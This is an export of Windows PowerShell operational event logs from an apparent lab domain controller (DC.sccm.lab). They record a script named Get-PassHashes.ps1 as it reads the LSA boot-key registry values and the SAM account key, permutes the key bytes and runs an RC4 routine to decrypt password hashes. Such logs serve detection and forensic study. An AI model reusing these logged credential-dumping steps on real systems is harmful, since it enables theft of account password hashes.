Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="Object"
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="PassThru"; value="True"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="key"
ParameterBinding(Add-Member): name="Value"; value="6, 253, 188, 75, 220, 238, 133, 38, 41, 30, 82, 59, 102, 226, 133, 40"
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="PassThru"; value="True"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="S"
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="PassThru"; value="True"
ParameterBinding(Add-Member): name="MemberType"; value="ScriptMethod"
ParameterBinding(Add-Member): name="Name"; value="init"
ParameterBinding(Add-Member): name="Value"; value="
        if (-not $this.S)
        {
            [byte[]]$this.S = 0..255;
            0..255 | % -begin{[long]$j=0;}{
                $j = ($j + $this.key[$($_ % $this.key.Length)] + $this.S[$_]) % $this.S.Length;
                $temp = $this.S[$_]; $this.S[$_] = $this.S[$j]; $this.S[$j] = $temp;
                }
        }
    "
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="PassThru"; value="True"
ParameterBinding(Add-Member): name="MemberType"; value="ScriptMethod"
ParameterBinding(Add-Member): name="Name"; value="encrypt"
ParameterBinding(Add-Member): name="Value"; value="
        $data = $args[0];
        $this.init();
        $outbuf = new-object byte[] $($data.Length);
        $S2 = $this.S[0..$this.S.Length];
        0..$($data.Length-1) | % -begin{$i=0;$j=0;} {
            $i = ($i+1) % $S2.Length;
            $j = ($j + $S2[$i]) % $S2.Length;
            $temp = $S2[$i];$S2[$i] = $S2[$j];$S2[$j] = $temp;
            $a = $data[$_];
            $b = $S2[ $($S2[$i]+$S2[$j]) % $S2.Length ];
            $outbuf[$_] = ($a -bxor $b);
        }
        return ,$outbuf;
    "
ParameterBinding(Add-Member): name="InputObject"; value="System.Object"
ParameterBinding(Add-Member): name="InputObject"; value="System.Object"
ParameterBinding(Add-Member): name="InputObject"; value="System.Object"
ParameterBinding(Add-Member): name="InputObject"; value="System.Object"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 96
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.513205000Z" />
    <EventRecordID>14229</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-6d3b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 96
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="Object"
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="PassThru"; value="True"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="key"
ParameterBinding(Add-Member): name="Value"; value="6, 253, 188, 75, 220, 238, 133, 38, 41, 30, 82, 59, 102, 226, 133, 40"
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="PassThru"; value="True"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="S"
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="PassThru"; value="True"
ParameterBinding(Add-Member): name="MemberType"; value="ScriptMethod"
ParameterBinding(Add-Member): name="Name"; value="init"
ParameterBinding(Add-Member): name="Value"; value="
        if (-not $this.S)
        {
            [byte[]]$this.S = 0..255;
            0..255 | % -begin{[long]$j=0;}{
                $j = ($j + $this.key[$($_ % $this.key.Length)] + $this.S[$_]) % $this.S.Length;
                $temp = $this.S[$_]; $this.S[$_] = $this.S[$j]; $this.S[$j] = $temp;
                }
        }
    "
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="PassThru"; value="True"
ParameterBinding(Add-Member): name="MemberType"; value="ScriptMethod"
ParameterBinding(Add-Member): name="Name"; value="encrypt"
ParameterBinding(Add-Member): name="Value"; value="
        $data = $args[0];
        $this.init();
        $outbuf = new-object byte[] $($data.Length);
        $S2 = $this.S[0..$this.S.Length];
        0..$($data.Length-1) | % -begin{$i=0;$j=0;} {
            $i = ($i+1) % $S2.Length;
            $j = ($j + $S2[$i]) % $S2.Length;
            $temp = $S2[$i];$S2[$i] = $S2[$j];$S2[$j] = $temp;
            $a = $data[$_];
            $b = $S2[ $($S2[$i]+$S2[$j]) % $S2.Length ];
            $outbuf[$_] = ($a -bxor $b);
        }
        return ,$outbuf;
    "
ParameterBinding(Add-Member): name="InputObject"; value="System.Object"
ParameterBinding(Add-Member): name="InputObject"; value="System.Object"
ParameterBinding(Add-Member): name="InputObject"; value="System.Object"
ParameterBinding(Add-Member): name="InputObject"; value="System.Object"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Get-Item): "Get-Item"
ParameterBinding(Get-Item): name="Path"; value="HKLM:\SAM\SAM\Domains\Account"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Get-Item
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 94
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.490857500Z" />
    <EventRecordID>14228</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-613b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Get-Item
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 94
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Get-Item): "Get-Item"
ParameterBinding(Get-Item): name="Path"; value="HKLM:\SAM\SAM\Domains\Account"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(ForEach-Object): "ForEach-Object"
ParameterBinding(ForEach-Object): name="Begin"; value="$i=0;"
ParameterBinding(ForEach-Object): name="Process"; value="$b2[$i]=$b[$_];$i++"
ParameterBinding(ForEach-Object): name="InputObject"; value="8"
ParameterBinding(ForEach-Object): name="InputObject"; value="5"
ParameterBinding(ForEach-Object): name="InputObject"; value="4"
ParameterBinding(ForEach-Object): name="InputObject"; value="2"
ParameterBinding(ForEach-Object): name="InputObject"; value="11"
ParameterBinding(ForEach-Object): name="InputObject"; value="9"
ParameterBinding(ForEach-Object): name="InputObject"; value="13"
ParameterBinding(ForEach-Object): name="InputObject"; value="3"
ParameterBinding(ForEach-Object): name="InputObject"; value="0"
ParameterBinding(ForEach-Object): name="InputObject"; value="6"
ParameterBinding(ForEach-Object): name="InputObject"; value="1"
ParameterBinding(ForEach-Object): name="InputObject"; value="12"
ParameterBinding(ForEach-Object): name="InputObject"; value="14"
ParameterBinding(ForEach-Object): name="InputObject"; value="10"
ParameterBinding(ForEach-Object): name="InputObject"; value="15"
ParameterBinding(ForEach-Object): name="InputObject"; value="7"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = ForEach-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 92
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.483686800Z" />
    <EventRecordID>14227</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-5f3b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = ForEach-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 92
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(ForEach-Object): "ForEach-Object"
ParameterBinding(ForEach-Object): name="Begin"; value="$i=0;"
ParameterBinding(ForEach-Object): name="Process"; value="$b2[$i]=$b[$_];$i++"
ParameterBinding(ForEach-Object): name="InputObject"; value="8"
ParameterBinding(ForEach-Object): name="InputObject"; value="5"
ParameterBinding(ForEach-Object): name="InputObject"; value="4"
ParameterBinding(ForEach-Object): name="InputObject"; value="2"
ParameterBinding(ForEach-Object): name="InputObject"; value="11"
ParameterBinding(ForEach-Object): name="InputObject"; value="9"
ParameterBinding(ForEach-Object): name="InputObject"; value="13"
ParameterBinding(ForEach-Object): name="InputObject"; value="3"
ParameterBinding(ForEach-Object): name="InputObject"; value="0"
ParameterBinding(ForEach-Object): name="InputObject"; value="6"
ParameterBinding(ForEach-Object): name="InputObject"; value="1"
ParameterBinding(ForEach-Object): name="InputObject"; value="12"
ParameterBinding(ForEach-Object): name="InputObject"; value="14"
ParameterBinding(ForEach-Object): name="InputObject"; value="10"
ParameterBinding(ForEach-Object): name="InputObject"; value="15"
ParameterBinding(ForEach-Object): name="InputObject"; value="7"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="byte[]"
ParameterBinding(New-Object): name="ArgumentList"; value="16"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 90
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.479021200Z" />
    <EventRecordID>14226</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-5e3b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 90
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="byte[]"
ParameterBinding(New-Object): name="ArgumentList"; value="16"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(ForEach-Object): "ForEach-Object"
ParameterBinding(ForEach-Object): name="Process"; value="$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)"
ParameterBinding(ForEach-Object): name="InputObject"; value="0"
ParameterBinding(ForEach-Object): name="InputObject"; value="1"
ParameterBinding(ForEach-Object): name="InputObject"; value="2"
ParameterBinding(ForEach-Object): name="InputObject"; value="3"
ParameterBinding(ForEach-Object): name="InputObject"; value="4"
ParameterBinding(ForEach-Object): name="InputObject"; value="5"
ParameterBinding(ForEach-Object): name="InputObject"; value="6"
ParameterBinding(ForEach-Object): name="InputObject"; value="7"
ParameterBinding(ForEach-Object): name="InputObject"; value="8"
ParameterBinding(ForEach-Object): name="InputObject"; value="9"
ParameterBinding(ForEach-Object): name="InputObject"; value="10"
ParameterBinding(ForEach-Object): name="InputObject"; value="11"
ParameterBinding(ForEach-Object): name="InputObject"; value="12"
ParameterBinding(ForEach-Object): name="InputObject"; value="13"
ParameterBinding(ForEach-Object): name="InputObject"; value="14"
ParameterBinding(ForEach-Object): name="InputObject"; value="15"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = ForEach-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 88
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.478765500Z" />
    <EventRecordID>14225</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-c93a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = ForEach-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 88
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(ForEach-Object): "ForEach-Object"
ParameterBinding(ForEach-Object): name="Process"; value="$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)"
ParameterBinding(ForEach-Object): name="InputObject"; value="0"
ParameterBinding(ForEach-Object): name="InputObject"; value="1"
ParameterBinding(ForEach-Object): name="InputObject"; value="2"
ParameterBinding(ForEach-Object): name="InputObject"; value="3"
ParameterBinding(ForEach-Object): name="InputObject"; value="4"
ParameterBinding(ForEach-Object): name="InputObject"; value="5"
ParameterBinding(ForEach-Object): name="InputObject"; value="6"
ParameterBinding(ForEach-Object): name="InputObject"; value="7"
ParameterBinding(ForEach-Object): name="InputObject"; value="8"
ParameterBinding(ForEach-Object): name="InputObject"; value="9"
ParameterBinding(ForEach-Object): name="InputObject"; value="10"
ParameterBinding(ForEach-Object): name="InputObject"; value="11"
ParameterBinding(ForEach-Object): name="InputObject"; value="12"
ParameterBinding(ForEach-Object): name="InputObject"; value="13"
ParameterBinding(ForEach-Object): name="InputObject"; value="14"
ParameterBinding(ForEach-Object): name="InputObject"; value="15"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="byte[]"
ParameterBinding(New-Object): name="ArgumentList"; value="16"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 86
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.467137900Z" />
    <EventRecordID>14224</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-5d3b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 86
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="byte[]"
ParameterBinding(New-Object): name="ArgumentList"; value="16"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(ForEach-Object): "ForEach-Object"
ParameterBinding(ForEach-Object): name="Process"; value="Get-RegKeyClass "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_""
ParameterBinding(ForEach-Object): name="InputObject"; value="JD"
ParameterBinding(ForEach-Object): name="InputObject"; value="Skew1"
ParameterBinding(ForEach-Object): name="InputObject"; value="GBG"
ParameterBinding(ForEach-Object): name="InputObject"; value="Data"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = ForEach-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 84
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.462581800Z" />
    <EventRecordID>14223</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-503b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = ForEach-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 84
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(ForEach-Object): "ForEach-Object"
ParameterBinding(ForEach-Object): name="Process"; value="Get-RegKeyClass "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_""
ParameterBinding(ForEach-Object): name="InputObject"; value="JD"
ParameterBinding(ForEach-Object): name="InputObject"; value="Skew1"
ParameterBinding(ForEach-Object): name="InputObject"; value="GBG"
ParameterBinding(ForEach-Object): name="InputObject"; value="Data"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Out-Null): "Out-Null"
ParameterBinding(Out-Null): name="InputObject"; value="0"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Out-Null
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 82
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.462482300Z" />
    <EventRecordID>14222</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-5c3b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
